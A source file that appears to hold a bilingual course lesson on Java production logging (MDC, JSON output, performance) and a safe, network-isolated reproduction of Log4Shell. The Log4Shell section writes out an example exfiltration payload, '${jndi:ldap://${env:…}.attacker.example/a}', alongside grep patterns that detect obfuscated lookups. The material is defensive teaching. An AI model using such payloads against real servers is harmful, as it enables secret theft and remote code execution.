/**
 * 10.7 — Log Java trên production: MDC, correlation id, JSON, hiệu năng, Log4Shell (soạn 24/11/2026).
 * Output thật: OUT['s10/spring-mdc-json'] (Spring Boot 4.1.1: MDC + TaskDecorator, logstash-logback-encoder 8.1,
 * logging.structured.format.console=ecs, LogBench 200 000 lời gọi debug ở mức INFO) và OUT['s10/log4shell']
 * (log4j-core 2.14.1 vs 2.17.1, container --network none, chỉ có một ServerSocket "tai nghe" trong cùng tiến trình — không payload).
 */
import { ma, lenh, nguon, lienKet, kv } from '../_chung.mjs';

export default {
  title: '10.7 — Java logging in production: MDC and correlation ids, JSON output, performance traps, and Log4Shell|||10.7 — Log Java trên production: MDC và correlation id, xuất JSON, bẫy hiệu năng, và Log4Shell',
  slug: 'log-10-7-java-mdc-json-hieu-nang',
  type: 'LESSON',
  isFreePreview: true,
  description: 'MDC là gì (ThreadLocal), filter gắn requestId và vì sao phải dọn trong finally; MDC không tự sang luồng @Async — chạy thật có và không có TaskDecorator; traceId/spanId tự có nhờ Micrometer Tracing; JSON bằng logstash-logback-encoder và structured logging có sẵn từ Spring Boot 3.4 (ECS); đo thật cái giá của log.debug nối chuỗi so với placeholder {}; AsyncAppender và cái giá mất log khi sập; Log4Shell CVE-2021-44228 tái hiện an toàn: cùng một dòng log, 2.14.1 tự mở kết nối LDAP còn 2.17.1 thì không; dò dấu vết và cách phòng.',
  content: `
<div class="ml-en">
<span class="eyebrow">Chapter 10 · Lesson 10.7</span>
<h2>Java logs in production: context on every line, JSON for machines, no slowdowns — and the day logging became an attack</h2>
<p class="lead">Lesson 10.6 made logs go to the right place. Production asks three more things: every line must say <em>which request</em> it belongs to (even on other threads), machines must be able to parse it (JSON), and logging must not slow the app or lose lines when it matters. Then the security part: in December 2021 a single logged string was enough to take over Java servers worldwide. You will reproduce why — safely.</p>

<h3>The everyday picture: the name tag at a conference</h3>
<p>At a conference everyone wears a name tag, so whoever you talk to knows who you are without asking. <strong>MDC</strong> (Mapped Diagnostic Context) pins a name tag — <code>requestId=req-c0ffee01</code> — on the thread handling a request; every log line written by that thread shows the tag automatically. When the work is handed to another person (another thread), the tag does not move by itself: someone must copy it.</p>

<h3>Part 1 — MDC: set, use, clear</h3>
<p>The filter from 10.6 does <code>MDC.put("requestId", id)</code> before the request and <code>MDC.remove("requestId")</code> in <code>finally</code>. MDC lives in a <strong>ThreadLocal</strong> — a per-thread map. Tomcat reuses its threads: without the <code>finally</code>, the next request on <code>exec-1</code> would carry the previous user's id, and your investigation would blame the wrong customer. Patterns read MDC with <code>%X{requestId}</code>; JSON encoders add every MDC key as a field.</p>

<h3>Part 2 — MDC and other threads: @Async</h3>
${ma('java', 's10/spring-lab/src/main/java/vn/lab/shop/AsyncConfig.java')}
${ma('java', 's10/spring-lab/src/main/java/vn/lab/shop/MailService.java')}
${lenh('s10/spring-mdc-json', 1)}
${lenh('s10/spring-mdc-json', 2)}
${lenh('s10/spring-mdc-json', 3)}
<p>With the <code>TaskDecorator</code>, the mail thread (<code>mail-1</code>) carries the same <code>requestId</code>, <code>traceId</code> and <code>spanId</code> as the request thread. The decorator copies the MDC map when the task is <em>submitted</em> (on the request thread) and installs it when the task <em>runs</em> (on the pool thread), then clears it. Now without it:</p>
${lenh('s10/spring-mdc-json', 4)}
${lenh('s10/spring-mdc-json', 5)}
<p><code>[rid=]</code> — the mail line is orphaned. In a real incident ("customer says no confirmation mail arrived"), you can no longer connect the mail attempt to the order. The same gap appears with <code>CompletableFuture.supplyAsync</code>, <code>@Scheduled</code> jobs, Kafka consumers and reactive code — anywhere work changes thread.</p>
<p><strong>traceId / spanId</strong> came for free: Spring Boot with Micrometer Tracing (here via <code>spring-boot-starter-opentelemetry</code>) puts them into MDC for every request, and passes the trace to other services in the W3C <code>traceparent</code> header. The trace itself (timing tree across services) is taught in the observability course; for log reading, the rule is: <em>search by traceId across all services' logs</em>.</p>
<p>Also note <code>a***@example.com</code>: the mail service masks the address before logging. Logging the order id is enough to investigate; the full email adds risk, not information (lesson 16.3).</p>

<h3>Part 3 — JSON output, two ways</h3>
<p><strong>(a) logstash-logback-encoder</strong> — the appender <code>JSON</code> in <code>logback-lab.xml</code> uses <code>LogstashEncoder</code>. The jq line above shows its field names: <code>@timestamp</code>, <code>level</code>, <code>thread_name</code>, <code>logger_name</code>, <code>message</code>, plus every MDC key. Exceptions go into a <code>stack_trace</code> field as one string — the multi-line stack trace stays inside one JSON line.</p>
<p><strong>(b) Spring Boot structured logging</strong> — since Spring Boot 3.4 no extra library is needed: one property.</p>
${lenh('s10/spring-mdc-json', 6)}
${lenh('s10/spring-mdc-json', 7)}
<p><code>logging.structured.format.console=ecs</code> (also <code>gelf</code>, <code>logstash</code>; and <code>logging.structured.format.file</code>). ECS = Elastic Common Schema: nested <code>log.level</code>, <code>process.thread.name</code>, <code>service.name</code> — the field names Elasticsearch/Kibana expect (lesson 10.8, Chapter 15). MDC values (<code>requestId</code>, <code>traceId</code>) are added at top level. Log4j2's equivalent is <code>JsonTemplateLayout</code> with an <code>EcsLayout.json</code> template.</p>

<h3>Part 4 — performance: what a log line costs</h3>
${ma('java', 's10/spring-lab/src/main/java/vn/lab/shop/LogBench.java')}
${lenh('s10/spring-mdc-json', 8)}
<p>The level is INFO, so <em>none</em> of the 600 000 debug calls prints anything. Yet the first loop cost about 342 ms: Java builds the argument <code>"cart = " + cart</code> <strong>before</strong> calling <code>debug</code>, which runs the expensive <code>toString()</code> 200 000 times and throws the result away. With the placeholder <code>{}</code>, SLF4J checks the level first and formats only if the line will be written: 0.12 ms. <code>isDebugEnabled()</code> is the manual version, useful when even computing the argument is expensive (<code>cart.toString()</code> here, or a database call).</p>
<ul>
<li><strong>Hot loops:</strong> one INFO line per item in a loop of a million items is a million lines. Log a summary (count, duration) after the loop.</li>
<li><strong>Synchronous I/O:</strong> by default an appender writes on the calling thread; a slow disk or network appender slows every request. <strong>Logback <code>AsyncAppender</code></strong> puts events in a queue (default 256) and writes on a background thread. Trade-offs: when the queue is 80% full it <em>discards TRACE/DEBUG/INFO</em> by default (<code>discardingThreshold</code>), and events still in the queue are <strong>lost if the process is killed</strong> — exactly the lines that explain the crash. Log4j2's async loggers (LMAX Disruptor) are faster but have the same loss window.</li>
<li><strong>Location info</strong> (<code>%line</code>, <code>%method</code>, <code>%file</code>) is computed from a stack trace for every line — expensive; avoid it in production patterns.</li>
</ul>

<h3>Part 5 — Hacker's corner: Log4Shell (CVE-2021-44228)</h3>
<p><strong>What happened.</strong> On 9–10 December 2021 a vulnerability in <code>log4j-core</code> 2.0-beta9 … 2.14.1 became public (reported privately to Apache on 24 November 2021 by Chen Zhaojun of Alibaba Cloud's security team). Severity: CVSS 10.0, the maximum. First public exploitation happened through Minecraft chat messages; within days, attackers were scanning the whole Internet, and national agencies (CISA in the US, NCSC in the UK) called it one of the most serious vulnerabilities in years. Reason: Log4j2 was inside countless Java products, often several dependencies deep.</p>
<p><strong>The mechanism</strong> — Log4j2 supported <em>lookups</em>: <code>\${java:version}</code>, <code>\${env:NAME}</code>, <code>\${jndi:ldap://host/x}</code> inside a log message were evaluated <em>when the message was written</em>. So if an app logged anything an attacker controlled — a User-Agent, a username, a search term — the attacker's text became instructions. We reproduce it in a container <strong>without network</strong>; the only "server" is a socket inside the same Java process:</p>
${ma('java', 's10/log4shell-lab/Demo.java')}
${lenh('s10/log4shell', 2)}
${lenh('s10/log4shell', 3)}
<p>Same code, same input. 2.14.1 <em>replaced</em> <code>\${java:version}</code> and <code>\${env:HOSTNAME}</code> with real values from the server; 2.17.1 logged the text literally. Now <code>\${env:AWS_SECRET_ACCESS_KEY}</code> instead of <code>HOSTNAME</code>, sent to an attacker's DNS name (<code>\${jndi:ldap://\${env:…}.attacker.example/a}</code>), and the secret leaves the server in a DNS query.</p>
${lenh('s10/log4shell', 4)}
${lenh('s10/log4shell', 5)}
<p>With 2.14.1 the logger <strong>opened a TCP connection</strong> to port 1389 and sent an LDAP bind (first byte <code>0x30</code>, the start of an LDAP message) — just because a string was logged. A real attacker's LDAP server answers with a reference to a Java class or a serialized object, and the server ends up running the attacker's code (remote code execution). Newer JDKs block loading remote classes by default (<code>trustURLCodebase=false</code> since 8u191), which stops the simplest variant, but not deserialization gadget chains nor the secret leak through DNS. 2.17.1 never connected.</p>
<p><strong>The fix chain</strong> (why "2.17.1" and not "2.15"): 2.15.0 (10/12/2021) first fix; 2.16.0 (13/12) disabled JNDI and removed message lookups after CVE-2021-45046; 2.17.0 (17/12) fixed a recursion DoS, CVE-2021-45105; 2.17.1 (28/12) fixed CVE-2021-44832 (JDBC appender, requires control of the config). Today use the current 2.x (the Spring Boot BOM manages it — 2.25.5 in this course).</p>
<p><strong>Finding traces in logs</strong> — attackers put the payload anywhere that might be logged, often obfuscated (<code>\${\${lower:j}ndi:…}</code>, URL-encoded <code>%24%7Bjndi</code>):</p>
<pre><code class="language-bash">grep -E '\\$\\{|%24%7B' access.log                  # any lookup syntax, plain or URL-encoded
zgrep -iE 'jndi|\\$\\{(lower|upper|env|sys|::-)' access.log*.gz</code></pre>
<p>Lab 10's scanner sent one (lesson 10.9 finds it). A match means "someone tried", not "we were hacked": the answer depends on whether a vulnerable <code>log4j-core</code> logged that field, and whether the server then made outgoing LDAP/RMI/DNS connections — check firewall and DNS logs (Chapter 11) for the attacker host.</p>
<p><strong>Prevention:</strong> know what is in your build (<code>mvn dependency:tree</code>, an SBOM, Dependabot/OWASP Dependency-Check); upgrade the logging library like any other dependency; block outgoing connections from servers that do not need them (most backends never need to reach the Internet on port 389/1389); and never treat "it is only a log line" as safe input.</p>

<h3>Real-life situations</h3>
<ul>
<li><strong>December 2021 at every Java outsourcing company:</strong> customers sent the same email — "Are you affected by Log4Shell? Answer within 24 hours." The engineers who could run <code>mvn dependency:tree | grep log4j-core</code> and explain "we have <code>log4j-api</code> + <code>log4j-to-slf4j</code> only, not core" answered in minutes. Interview question material.</li>
<li><strong>Customer: "the confirmation mail never arrived for order 7".</strong> With MDC propagated you grep one request id and see controller → mail thread → SMTP error. Without it you guess by timestamps.</li>
<li><strong>What if</strong> a performance test shows 30% of CPU in logging? Look for string concatenation in debug calls, location info in the pattern, and synchronous file appenders.</li>
</ul>

<h3>🧪 Practice (30 min)</h3>
<div class="callout ok"><ol>
<li>Add <code>userId</code> to MDC in the filter (use a fixed header <code>X-User-Id</code> for the lab), and show it in the console pattern and in <code>shop.json</code>.</li>
<li>Comment out the <code>MDC.remove</code> of <code>userId</code> (set only when the header exists) with a pool of one thread (<code>server.tomcat.threads.max=1</code>): first a request with <code>X-User-Id: an</code>, then one without the header, and explain what you see.</li>
<li>Run <code>LogBench</code> with the level set to DEBUG in <code>logback-bench.xml</code> (output to <code>/dev/null</code>) and compare the three numbers again.</li>
<li>Run the Log4Shell demo with <code>'\${sys:user.name} \${sys:os.name}'</code> on both versions.</li>
</ol>
<p><strong>Done when:</strong> 1 shows <code>userId</code> on every line of a request including <code>mail-1</code>; 2 shows the second request logged as <code>an</code> — a user id leaking between requests; 3 shows all three loops costing about the same (because now every line is written); 4 shows real values only on 2.14.1.</p></div>

<h3>🗂 Key terms</h3>
${kv([
  ['MDC', 'Mapped Diagnostic Context: per-thread key/value map added to every log line.'],
  ['ThreadLocal', 'Java variable with one value per thread; the storage behind MDC.'],
  ['TaskDecorator', 'Spring hook that wraps tasks submitted to an executor — used to copy MDC.'],
  ['structured logging (Spring Boot 3.4+)', 'Built-in JSON output: logging.structured.format.console=ecs|gelf|logstash.'],
  ['placeholder {}', 'SLF4J parameter: formatting happens only if the level is enabled.'],
  ['AsyncAppender', 'Logback appender that queues events for a background thread; may drop or lose events.'],
  ['Log4Shell', 'CVE-2021-44228: Log4j2 ≤ 2.14.1 evaluated \${jndi:…} lookups in logged data, leading to RCE.'],
])}

<h3>📌 Summary</h3>
<ul>
<li>MDC = per-thread name tag; set in a filter, clear in <code>finally</code>, copy to other threads with a TaskDecorator.</li>
<li>traceId/spanId come from Micrometer Tracing; search all services by traceId.</li>
<li>JSON: logstash-logback-encoder, or Spring Boot's built-in <code>logging.structured.format.*</code> (ECS).</li>
<li>Use <code>{}</code>, not <code>+</code>; no logs in hot loops; async appenders trade speed for possible loss.</li>
<li>Log4Shell: logging attacker text made 2.14.1 run lookups and connect out; patch, know your dependencies, block egress, grep for <code>\${</code>.</li>
</ul>
${nguon('📘', 'Logback manual — MDC', 'MDC, ThreadLocal, propagation to child threads', 'https://logback.qos.ch/manual/mdc.html')}
${nguon('📘', 'logstash-logback-encoder', 'LogstashEncoder fields, MDC, stack_trace', 'https://github.com/logfellow/logstash-logback-encoder')}
${nguon('📘', 'Spring Boot reference — Logging (Structured Logging)', 'ECS, GELF, Logstash formats', 'https://docs.spring.io/spring-boot/reference/features/logging.html')}
${nguon('📘', 'Log4j 2 — JSON Template Layout', 'JSON output for Log4j2 with ECS template', 'https://logging.apache.org/log4j/2.x/manual/json-template-layout.html')}
${nguon('🛡', 'NVD — CVE-2021-44228', 'Official record, CVSS 10.0, affected versions', 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228')}
${nguon('🛡', 'Apache Log4j — Security', 'All Log4j CVEs and fixed versions', 'https://logging.apache.org/log4j/2.x/security.html')}
${nguon('🛡', 'NCSC — Log4j vulnerability: what everyone needs to know', 'Plain-language explanation from the UK NCSC', 'https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know')}
${lienKet({ khoa: 'observability-monitoring', bai: 'obs-3-1-id-di-den-hu-vo', title: 'Observability 3.1 — Correlation ids', sub: 'Carrying ids across services and the trace context', cta: 'Open lesson' })}
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 10 · Bài 10.7</span>
<h2>Log Java trên production: ngữ cảnh trên mọi dòng, JSON cho máy đọc, không làm chậm app — và ngày việc ghi log trở thành đòn tấn công</h2>
<p class="lead">Bài 10.6 đã đưa log tới đúng chỗ. Production còn đòi ba điều nữa: dòng nào cũng phải nói nó thuộc <em>request nào</em> (kể cả ở luồng khác), máy phải phân tích được (JSON), và việc ghi log không được làm chậm app hay đánh rơi dòng đúng lúc cần. Rồi tới phần bảo mật: tháng 12/2021, chỉ cần ghi log một chuỗi là đủ chiếm server Java khắp thế giới. Bạn sẽ tái hiện vì sao — một cách an toàn.</p>

<h3>Liên tưởng đời thường: thẻ tên ở hội thảo</h3>
<p>Ở hội thảo ai cũng đeo thẻ tên, nên bạn nói chuyện với ai thì người đó biết bạn là ai mà không cần hỏi. <strong>MDC</strong> (Mapped Diagnostic Context) gắn một thẻ tên — <code>requestId=req-c0ffee01</code> — lên luồng đang xử lý một request; mọi dòng log luồng đó viết ra đều tự hiện thẻ. Khi việc được giao cho người khác (luồng khác), thẻ không tự chuyển theo: phải có ai đó chép sang.</p>

<h3>Phần 1 — MDC: gắn, dùng, gỡ</h3>
<p>Filter ở bài 10.6 làm <code>MDC.put("requestId", id)</code> trước request và <code>MDC.remove("requestId")</code> trong <code>finally</code>. MDC sống trong một <strong>ThreadLocal</strong> — một bảng riêng của từng luồng. Tomcat tái dùng luồng: thiếu <code>finally</code>, request kế tiếp trên <code>exec-1</code> sẽ mang id của người dùng trước, và cuộc điều tra của bạn đổ lỗi nhầm khách hàng. Pattern đọc MDC bằng <code>%X{requestId}</code>; encoder JSON thêm mọi khoá MDC thành trường.</p>

<h3>Phần 2 — MDC và luồng khác: @Async</h3>
${ma('java', 's10/spring-lab/src/main/java/vn/lab/shop/AsyncConfig.java')}
${ma('java', 's10/spring-lab/src/main/java/vn/lab/shop/MailService.java')}
${lenh('s10/spring-mdc-json', 1)}
${lenh('s10/spring-mdc-json', 2)}
${lenh('s10/spring-mdc-json', 3)}
<p>Có <code>TaskDecorator</code>, luồng gửi thư (<code>mail-1</code>) mang cùng <code>requestId</code>, <code>traceId</code> và <code>spanId</code> với luồng request. Decorator chép bảng MDC lúc tác vụ được <em>giao</em> (trên luồng request) và cài nó vào lúc tác vụ <em>chạy</em> (trên luồng của pool), rồi dọn đi. Giờ bỏ nó ra:</p>
${lenh('s10/spring-mdc-json', 4)}
${lenh('s10/spring-mdc-json', 5)}
<p><code>[rid=]</code> — dòng gửi thư mồ côi. Trong một sự cố thật ("khách nói không nhận được thư xác nhận"), bạn không còn nối được lần gửi thư với đơn hàng. Lỗ hổng y hệt xuất hiện với <code>CompletableFuture.supplyAsync</code>, job <code>@Scheduled</code>, consumer Kafka và mã reactive — bất cứ chỗ nào công việc đổi luồng.</p>
<p><strong>traceId / spanId</strong> có sẵn miễn phí: Spring Boot cùng Micrometer Tracing (ở đây qua <code>spring-boot-starter-opentelemetry</code>) đặt chúng vào MDC cho mọi request, và chuyển trace sang dịch vụ khác qua header W3C <code>traceparent</code>. Bản thân trace (cây thời gian xuyên dịch vụ) được dạy ở khoá observability; với việc đọc log, quy tắc là: <em>tìm theo traceId trong log của mọi dịch vụ</em>.</p>
<p>Để ý cả <code>a***@example.com</code>: dịch vụ thư che địa chỉ trước khi ghi log. Log mã đơn hàng là đủ để điều tra; email đầy đủ chỉ thêm rủi ro chứ không thêm thông tin (bài 16.3).</p>

<h3>Phần 3 — xuất JSON, hai cách</h3>
<p><strong>(a) logstash-logback-encoder</strong> — appender <code>JSON</code> trong <code>logback-lab.xml</code> dùng <code>LogstashEncoder</code>. Dòng jq ở trên cho thấy tên trường của nó: <code>@timestamp</code>, <code>level</code>, <code>thread_name</code>, <code>logger_name</code>, <code>message</code>, cộng mọi khoá MDC. Ngoại lệ được đưa vào trường <code>stack_trace</code> dưới dạng một chuỗi — stack trace nhiều dòng vẫn nằm gọn trong một dòng JSON.</p>
<p><strong>(b) Structured logging của Spring Boot</strong> — từ Spring Boot 3.4 không cần thêm thư viện: một thuộc tính là xong.</p>
${lenh('s10/spring-mdc-json', 6)}
${lenh('s10/spring-mdc-json', 7)}
<p><code>logging.structured.format.console=ecs</code> (còn có <code>gelf</code>, <code>logstash</code>; và <code>logging.structured.format.file</code>). ECS = Elastic Common Schema: lồng nhau kiểu <code>log.level</code>, <code>process.thread.name</code>, <code>service.name</code> — đúng tên trường mà Elasticsearch/Kibana chờ đợi (bài 10.8, Chương 15). Giá trị MDC (<code>requestId</code>, <code>traceId</code>) được thêm ở cấp ngoài cùng. Bên Log4j2, thứ tương đương là <code>JsonTemplateLayout</code> với mẫu <code>EcsLayout.json</code>.</p>

<h3>Phần 4 — hiệu năng: một dòng log tốn bao nhiêu</h3>
${ma('java', 's10/spring-lab/src/main/java/vn/lab/shop/LogBench.java')}
${lenh('s10/spring-mdc-json', 8)}
<p>Mức đang là INFO, nên <em>không</em> lời gọi debug nào trong 600 000 lời gọi in ra gì. Vậy mà vòng đầu tốn khoảng 342 ms: Java dựng đối số <code>"cart = " + cart</code> <strong>trước</strong> khi gọi <code>debug</code>, tức chạy <code>toString()</code> đắt đỏ 200 000 lần rồi vứt kết quả đi. Với chỗ giữ chỗ <code>{}</code>, SLF4J kiểm tra mức trước và chỉ định dạng nếu dòng thật sự được ghi: 0,12 ms. <code>isDebugEnabled()</code> là phiên bản thủ công, có ích khi ngay cả việc tính đối số cũng đắt (ở đây <code>cart.toString()</code>, hoặc một lời gọi CSDL).</p>
<ul>
<li><strong>Vòng lặp nóng:</strong> mỗi phần tử một dòng INFO trong vòng lặp một triệu phần tử là một triệu dòng. Hãy log một dòng tổng kết (số lượng, thời gian) sau vòng lặp.</li>
<li><strong>I/O đồng bộ:</strong> mặc định appender ghi ngay trên luồng gọi; đĩa chậm hay appender mạng chậm làm chậm mọi request. <strong><code>AsyncAppender</code> của Logback</strong> đưa sự kiện vào hàng đợi (mặc định 256) và ghi trên một luồng nền. Cái giá: khi hàng đợi đầy 80%, mặc định nó <em>bỏ TRACE/DEBUG/INFO</em> (<code>discardingThreshold</code>), và sự kiện còn trong hàng đợi <strong>mất sạch nếu tiến trình bị giết</strong> — đúng những dòng giải thích cú sập. Async logger của Log4j2 (LMAX Disruptor) nhanh hơn nhưng có cùng khoảng mất đó.</li>
<li><strong>Thông tin vị trí</strong> (<code>%line</code>, <code>%method</code>, <code>%file</code>) được tính từ một stack trace cho mỗi dòng — đắt; tránh dùng trong pattern production.</li>
</ul>

<h3>Phần 5 — Góc hacker: Log4Shell (CVE-2021-44228)</h3>
<p><strong>Chuyện gì đã xảy ra.</strong> Ngày 9–10/12/2021, một lỗ hổng trong <code>log4j-core</code> 2.0-beta9 … 2.14.1 bị công khai (đã được Chen Zhaojun thuộc đội bảo mật Alibaba Cloud báo riêng cho Apache ngày 24/11/2021). Mức nghiêm trọng: CVSS 10.0, mức tối đa. Vụ khai thác công khai đầu tiên diễn ra qua tin nhắn chat trong Minecraft; chỉ vài ngày sau, kẻ tấn công quét toàn bộ Internet, và các cơ quan quốc gia (CISA ở Mỹ, NCSC ở Anh) gọi nó là một trong những lỗ hổng nghiêm trọng nhất nhiều năm. Lý do: Log4j2 nằm trong vô số sản phẩm Java, thường ở sâu vài tầng phụ thuộc.</p>
<p><strong>Cơ chế</strong> — Log4j2 hỗ trợ <em>lookup</em>: <code>\${java:version}</code>, <code>\${env:NAME}</code>, <code>\${jndi:ldap://host/x}</code> nằm trong thông điệp log được tính giá trị <em>ngay lúc ghi</em>. Vậy nếu app ghi log bất cứ thứ gì kẻ tấn công điều khiển được — User-Agent, tên đăng nhập, từ khoá tìm kiếm — chữ của kẻ tấn công trở thành mệnh lệnh. Ta tái hiện trong một container <strong>không có mạng</strong>; "máy chủ" duy nhất là một socket bên trong chính tiến trình Java đó:</p>
${ma('java', 's10/log4shell-lab/Demo.java')}
${lenh('s10/log4shell', 2)}
${lenh('s10/log4shell', 3)}
<p>Cùng mã, cùng đầu vào. 2.14.1 đã <em>thay</em> <code>\${java:version}</code> và <code>\${env:HOSTNAME}</code> bằng giá trị thật của server; 2.17.1 ghi nguyên văn. Giờ thay <code>HOSTNAME</code> bằng <code>\${env:AWS_SECRET_ACCESS_KEY}</code>, gửi tới một tên miền của kẻ tấn công (<code>\${jndi:ldap://\${env:…}.attacker.example/a}</code>), là khoá bí mật rời server trong một truy vấn DNS.</p>
${lenh('s10/log4shell', 4)}
${lenh('s10/log4shell', 5)}
<p>Với 2.14.1, thư viện log đã <strong>tự mở một kết nối TCP</strong> tới cổng 1389 và gửi một gói LDAP bind (byte đầu <code>0x30</code>, khởi đầu một thông điệp LDAP) — chỉ vì một chuỗi được ghi log. Máy chủ LDAP thật của kẻ tấn công sẽ trả về một tham chiếu tới lớp Java hoặc một đối tượng tuần tự hoá, và server rốt cuộc chạy mã của kẻ tấn công (thực thi mã từ xa). JDK đời mới mặc định chặn nạp lớp từ xa (<code>trustURLCodebase=false</code> từ 8u191), chặn được biến thể đơn giản nhất, nhưng không chặn được chuỗi gadget giải tuần tự hoá, cũng không chặn được việc rò bí mật qua DNS. 2.17.1 không hề kết nối.</p>
<p><strong>Chuỗi bản vá</strong> (vì sao là "2.17.1" chứ không phải "2.15"): 2.15.0 (10/12/2021) bản vá đầu; 2.16.0 (13/12) tắt JNDI và bỏ lookup trong thông điệp sau CVE-2021-45046; 2.17.0 (17/12) sửa lỗi đệ quy gây từ chối dịch vụ CVE-2021-45105; 2.17.1 (28/12) sửa CVE-2021-44832 (JDBC appender, cần quyền sửa cấu hình). Hiện nay hãy dùng bản 2.x mới nhất (BOM của Spring Boot quản lý — khoá này là 2.25.5).</p>
<p><strong>Tìm dấu vết trong log</strong> — kẻ tấn công nhét payload vào mọi chỗ có thể bị ghi log, thường được nguỵ trang (<code>\${\${lower:j}ndi:…}</code>, mã hoá URL <code>%24%7Bjndi</code>):</p>
<pre><code class="language-bash">grep -E '\\$\\{|%24%7B' access.log                  # mọi cú pháp lookup, dạng thường hoặc mã hoá URL
zgrep -iE 'jndi|\\$\\{(lower|upper|env|sys|::-)' access.log*.gz</code></pre>
<p>Máy quét của Lab 10 đã gửi một phát (bài 10.9 sẽ tìm ra). Trùng khớp nghĩa là "có kẻ đã thử", không phải "ta đã bị hack": câu trả lời tuỳ vào việc một <code>log4j-core</code> có lỗ hổng có ghi log trường đó không, và server sau đó có mở kết nối LDAP/RMI/DNS ra ngoài không — kiểm tra log tường lửa và DNS (Chương 11) với máy của kẻ tấn công.</p>
<p><strong>Phòng ngừa:</strong> biết bản build của bạn có gì (<code>mvn dependency:tree</code>, SBOM, Dependabot/OWASP Dependency-Check); nâng cấp thư viện log như mọi phụ thuộc khác; chặn kết nối đi ra từ những server không cần (đa số backend không bao giờ cần ra Internet ở cổng 389/1389); và đừng bao giờ coi "chỉ là một dòng log" là đầu vào an toàn.</p>

<h3>Tình huống đời thật</h3>
<ul>
<li><strong>Tháng 12/2021 ở mọi công ty outsourcing Java:</strong> khách hàng gửi cùng một email — "Hệ thống có bị ảnh hưởng bởi Log4Shell không? Trả lời trong 24 giờ." Kỹ sư nào chạy được <code>mvn dependency:tree | grep log4j-core</code> và giải thích "chúng tôi chỉ có <code>log4j-api</code> + <code>log4j-to-slf4j</code>, không có core" thì trả lời trong vài phút. Chất liệu cho câu hỏi phỏng vấn.</li>
<li><strong>Khách: "đơn 7 không bao giờ nhận được thư xác nhận".</strong> Có MDC được truyền sang luồng khác, bạn grep một request id và thấy controller → luồng gửi thư → lỗi SMTP. Không có thì bạn đoán theo giờ.</li>
<li><strong>Nếu</strong> bài kiểm thử hiệu năng cho thấy 30% CPU nằm ở việc ghi log? Tìm nối chuỗi trong lời gọi debug, thông tin vị trí trong pattern, và appender ghi tệp đồng bộ.</li>
</ul>

<h3>🧪 Thực hành (30 phút)</h3>
<div class="callout ok"><ol>
<li>Thêm <code>userId</code> vào MDC trong filter (lab thì lấy từ header cố định <code>X-User-Id</code>), và cho hiện trong pattern console lẫn <code>shop.json</code>.</li>
<li>Biến dòng <code>MDC.remove</code> của <code>userId</code> (chỉ gắn khi có header) thành chú thích, với pool chỉ một luồng (<code>server.tomcat.threads.max=1</code>): gửi một request có <code>X-User-Id: an</code>, rồi một request không có header đó, và giải thích điều bạn thấy.</li>
<li>Chạy <code>LogBench</code> với mức DEBUG trong <code>logback-bench.xml</code> (output đổ vào <code>/dev/null</code>) và so lại ba con số.</li>
<li>Chạy demo Log4Shell với <code>'\${sys:user.name} \${sys:os.name}'</code> trên cả hai phiên bản.</li>
</ol>
<p><strong>Đạt khi:</strong> câu 1 có <code>userId</code> trên mọi dòng của một request kể cả <code>mail-1</code>; câu 2 cho thấy request thứ hai bị ghi là <code>an</code> — id người dùng rò từ request này sang request khác; câu 3 cho ba vòng tốn xấp xỉ nhau (vì giờ dòng nào cũng được ghi); câu 4 chỉ 2.14.1 hiện giá trị thật.</p></div>

<h3>🗂 Thuật ngữ trong bài</h3>
${kv([
  ['MDC', 'Mapped Diagnostic Context: bảng khoá/giá trị riêng mỗi luồng, được thêm vào mọi dòng log.'],
  ['ThreadLocal', 'Biến Java có một giá trị riêng cho mỗi luồng; nơi lưu MDC.'],
  ['TaskDecorator', 'Móc của Spring bọc các tác vụ giao cho executor — dùng để chép MDC.'],
  ['structured logging (Spring Boot 3.4+)', 'Xuất JSON có sẵn: logging.structured.format.console=ecs|gelf|logstash.'],
  ['placeholder {}', 'Tham số của SLF4J: chỉ định dạng khi mức log được bật.'],
  ['AsyncAppender', 'Appender của Logback đưa sự kiện vào hàng đợi cho luồng nền; có thể bỏ hoặc mất sự kiện.'],
  ['Log4Shell', 'CVE-2021-44228: Log4j2 ≤ 2.14.1 tính lookup \${jndi:…} trong dữ liệu được log, dẫn tới thực thi mã từ xa.'],
])}

<h3>📌 Tóm tắt</h3>
<ul>
<li>MDC = thẻ tên của từng luồng; gắn trong filter, gỡ trong <code>finally</code>, chép sang luồng khác bằng TaskDecorator.</li>
<li>traceId/spanId đến từ Micrometer Tracing; tìm theo traceId trong mọi dịch vụ.</li>
<li>JSON: logstash-logback-encoder, hoặc <code>logging.structured.format.*</code> có sẵn của Spring Boot (ECS).</li>
<li>Dùng <code>{}</code>, đừng dùng <code>+</code>; không log trong vòng lặp nóng; appender bất đồng bộ đổi tốc độ lấy nguy cơ mất log.</li>
<li>Log4Shell: ghi log chữ của kẻ tấn công khiến 2.14.1 chạy lookup và kết nối ra ngoài; vá, biết phụ thuộc của mình, chặn đi ra, grep tìm <code>\${</code>.</li>
</ul>
${nguon('📘', 'Logback manual — MDC', 'MDC, ThreadLocal, truyền sang luồng con', 'https://logback.qos.ch/manual/mdc.html')}
${nguon('📘', 'logstash-logback-encoder', 'Trường của LogstashEncoder, MDC, stack_trace', 'https://github.com/logfellow/logstash-logback-encoder')}
${nguon('📘', 'Spring Boot reference — Logging (Structured Logging)', 'Định dạng ECS, GELF, Logstash', 'https://docs.spring.io/spring-boot/reference/features/logging.html')}
${nguon('📘', 'Log4j 2 — JSON Template Layout', 'Xuất JSON cho Log4j2 với mẫu ECS', 'https://logging.apache.org/log4j/2.x/manual/json-template-layout.html')}
${nguon('🛡', 'NVD — CVE-2021-44228', 'Hồ sơ chính thức, CVSS 10.0, các phiên bản bị ảnh hưởng', 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228')}
${nguon('🛡', 'Apache Log4j — Security', 'Mọi CVE của Log4j và phiên bản đã vá', 'https://logging.apache.org/log4j/2.x/security.html')}
${nguon('🛡', 'NCSC — Log4j vulnerability: what everyone needs to know', 'Giải thích dễ hiểu của NCSC Anh', 'https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know')}
${lienKet({ khoa: 'observability-monitoring', bai: 'obs-3-1-id-di-den-hu-vo', title: 'Observability 3.1 — Correlation id', sub: 'Mang id qua các dịch vụ và trace context', cta: 'Mở bài' })}
</div>
`,
};
